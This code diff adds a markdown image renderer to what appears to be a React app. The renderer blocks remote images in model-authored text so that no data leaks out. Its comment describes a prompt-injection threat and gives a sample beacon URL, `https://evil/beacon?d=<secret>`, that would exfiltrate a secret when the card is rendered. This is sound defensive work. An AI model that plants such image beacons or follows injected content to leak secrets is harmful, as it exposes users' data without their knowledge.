@@ -75,6 +75,25 @@ const components: Components = {
       {...p}
     />
   ),
+  // Remote images are NEVER fetched. Markdown here renders model-authored text, and a
+  // teammate's report is attacker-influenced by design (it summarises repo content, which
+  // can carry a prompt injection). `![](https://evil/beacon?d=<secret>)` would otherwise
+  // exfiltrate on render — zero click, just scrolling the card into view — and there is no
+  // CSP to fall back on. Relative/same-origin sources are the app's own and still load.
+  // The URL stays visible in the tooltip so nothing is hidden from the user.
+  img: ({ node, src, alt, ...p }) => {
+    const url = typeof src === 'string' ? src : ''
+    const remote = /^[a-z][a-z0-9+.-]*:/i.test(url) && !url.startsWith('data:image/')
+    if (!remote) return <img className="max-w-full rounded" src={url} alt={alt ?? ''} {...p} />
+    return (
+      <span
+        title={`Blocked remote image: ${url}`}
+        className="inline-flex items-center gap-1 rounded border border-ctp-surface2 bg-ctp-surface0/60 px-1.5 py-0.5 text-[11px] text-ctp-overlay align-middle"
+      >
+        🚫 image not loaded{alt ? `: ${alt}` : ''}
+      </span>
+    )
+  },
   blockquote: ({ node, ...p }) => (
     <blockquote className="border-l-2 border-ctp-surface2 pl-3 my-1.5 text-ctp-subtext italic" {...p} />
   ),
